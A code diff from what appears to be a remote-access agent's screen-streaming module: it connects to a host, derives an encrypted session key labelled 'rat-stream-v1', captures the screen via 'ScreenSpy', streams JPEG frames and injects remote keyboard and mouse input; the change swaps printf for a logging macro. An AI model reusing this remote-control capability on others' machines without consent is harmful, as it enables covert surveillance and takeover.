@@ -3,6 +3,7 @@
 //   握手(StreamHello/Ack) → 派生 stream_key → 帧循环(抓屏+JPEG+加密上行)
 //   + 输入事件接收(解密 → SendInput 注入)
 #include "screen_stream.h"
+#include "agent_debug.h"
 
 #include "crypto.h"
 #include "desktop_switch.h"
@@ -88,7 +89,7 @@ private:
             return false;
         std::string err;
         if (!decode_header(buf_.data(), h, err)) {
-            printf("[stream] bad header in input stream: %s\n", err.c_str());
+            AGENT_LOG("[stream] bad header in input stream: %s\n", err.c_str());
             broken_ = true;
             return false;
         }
@@ -200,11 +201,11 @@ unsigned __stdcall stream_proc(void* param) {
             g_thread_alive.store(false);
         }
     } guard;
-    printf("[stream] connecting to %s:%u...\n", g_host.c_str(), kStreamPort);
+    AGENT_LOG("[stream] connecting to %s:%u...\n", g_host.c_str(), kStreamPort);
 
     SOCKET sock = INVALID_SOCKET;
     if (!net_connect(g_host, kStreamPort, &sock, 5000)) {
-        printf("[stream] connect failed\n");
+        AGENT_LOG("[stream] connect failed\n");
         return 1;
     }
 
@@ -218,7 +219,7 @@ unsigned __stdcall stream_proc(void* param) {
     Header h;
     h.cmd = kCmdStreamHello;
     if (!net_write_packet(sock, h, hello.data(), hello.size())) {
-        printf("[stream] send hello failed\n");
+        AGENT_LOG("[stream] send hello failed\n");
         net_close(sock);
         return 1;
     }
@@ -226,7 +227,7 @@ unsigned __stdcall stream_proc(void* param) {
     std::vector<uint8_t> ack;
     if (!net_read_packet(sock, ack_h, ack, 5000) || ack_h.cmd != kCmdStreamAck ||
         ack.size() < kServerNonceLen) {
-        printf("[stream] handshake failed\n");
+        AGENT_LOG("[stream] handshake failed\n");
         net_close(sock);
         return 1;
     }
@@ -239,14 +240,14 @@ unsigned __stdcall stream_proc(void* param) {
     std::vector<uint8_t> stream_key =
         hkdf_sha256(g_cfg.psk.data(), g_cfg.psk.size(), salt.data(), salt.size(),
                     (const uint8_t*)"rat-stream-v1", 13, kSessionKeyLen);
-    printf("[stream] connected, key derived\n");
+    AGENT_LOG("[stream] connected, key derived\n");
 
     // 帧循环（本线程内：抓屏 + 编码 + 发送；读输入在循环里轮询）
-    printf("[stream] creating ScreenSpy...\n");
+    AGENT_LOG("[stream] creating ScreenSpy...\n");
     ScreenSpy* spy = ScreenSpy::create(32, false, -1, -1, -1, -1, g_stream_scale);
-    printf("[stream] ScreenSpy created=%p\n", (void*)spy);
+    AGENT_LOG("[stream] ScreenSpy created=%p\n", (void*)spy);
     if (!spy) {
-        printf("[stream] ScreenSpy create failed\n");
+        AGENT_LOG("[stream] ScreenSpy create failed\n");
         net_close(sock);
         return 1;
     }
@@ -287,7 +288,7 @@ unsigned __stdcall stream_proc(void* param) {
                         replay_input_events(
                             reinterpret_cast<const InputEvent*>(plain.data() + 4),
                             count);
-                        printf("[stream] injected %u input events (total %u)\n",
+                        AGENT_LOG("[stream] injected %u input events (total %u)\n",
                                count, input_events);
                     }
                 }
@@ -295,7 +296,7 @@ unsigned __stdcall stream_proc(void* param) {
             continue;  // 继续收包/抓下一帧
         }
         if (in.broken()) {
-            printf("[stream] input channel broken\n");
+            AGENT_LOG("[stream] input channel broken\n");
             break;
         }
 
@@ -327,14 +328,14 @@ unsigned __stdcall stream_proc(void* param) {
                     fh.seq = seq++;
                     fh.cmd = kCmdScreenFrame;
                     if (!net_write_packet(sock, fh, sealed.data(), sealed.size())) {
-                        printf("[stream] send frame #%u FAILED (conn broken)\n", seq);
+                        AGENT_LOG("[stream] send frame #%u FAILED (conn broken)\n", seq);
                         break;
                     }
                     sent_frames++;
                     if (sent_frames == 1 || sent_frames % 25 == 0) {
                         DWORD el = GetTickCount() - t0;
                         float fps = el > 0 ? sent_frames * 1000.0f / el : 0;
-                        printf("[stream] sent %u frames (%.1f fps, last jpeg=%zu B)\n",
+                        AGENT_LOG("[stream] sent %u frames (%.1f fps, last jpeg=%zu B)\n",
                                sent_frames, fps, jpeg.size());
                     }
                 }
@@ -348,7 +349,7 @@ unsigned __stdcall stream_proc(void* param) {
 
     delete spy;
     net_close(sock);
-    printf("[stream] stopped (sent=%u frames, injected=%u input events)\n",
+    AGENT_LOG("[stream] stopped (sent=%u frames, injected=%u input events)\n",
            sent_frames, input_events);
     return 0;
 }
@@ -369,7 +370,7 @@ void screen_stream_set_config(const std::string& host, const AgentConfig& cfg) {
 bool start_screen_stream(int fps, int quality, float scale) {
     reap_finished_thread();  // 回收上一次已退出线程的句柄
     if (g_thread_alive.load()) {
-        printf("[stream] start ignored: already running\n");
+        AGENT_LOG("[stream] start ignored: already running\n");
         return false;  // 已在运行
     }
     // 参数生效：帧率、JPEG 质量（透传到 stream_proc / WIC 编码器）、抓屏缩放
@@ -384,20 +385,20 @@ bool start_screen_stream(int fps, int quality, float scale) {
     if (!g_thread) {
         g_thread_alive.store(false);
         g_running.store(false);
-        printf("[stream] create thread failed\n");
+        AGENT_LOG("[stream] create thread failed\n");
         return false;
     }
-    printf("[stream] start requested (fps=%d quality=%d scale=%.2f thread=%p)\n",
+    AGENT_LOG("[stream] start requested (fps=%d quality=%d scale=%.2f thread=%p)\n",
            g_stream_fps, g_stream_quality, (double)g_stream_scale, (void*)g_thread);
     return true;
 }
 
 void stop_screen_stream() {
-    printf("[stream] stop requested\n");
+    AGENT_LOG("[stream] stop requested\n");
     g_running.store(false);
     reap_finished_thread();
     if (!g_thread) {
-        printf("[stream] stop: no thread running\n");
+        AGENT_LOG("[stream] stop: no thread running\n");
         return;
     }
     // 线程可能在超时后仍活着：此时保留句柄、不置空，也不允许 start 起第二条线程
@@ -405,9 +406,9 @@ void stop_screen_stream() {
         CloseHandle(g_thread);
         g_thread = nullptr;
         g_thread_alive.store(false);
-        printf("[stream] stop done\n");
+        AGENT_LOG("[stream] stop done\n");
     } else {
-        printf("[stream] stop: thread did not exit in 5s "
+        AGENT_LOG("[stream] stop: thread did not exit in 5s "
                "(handle kept; 下次 start/stop 时自动回收)\n");
     }
 }
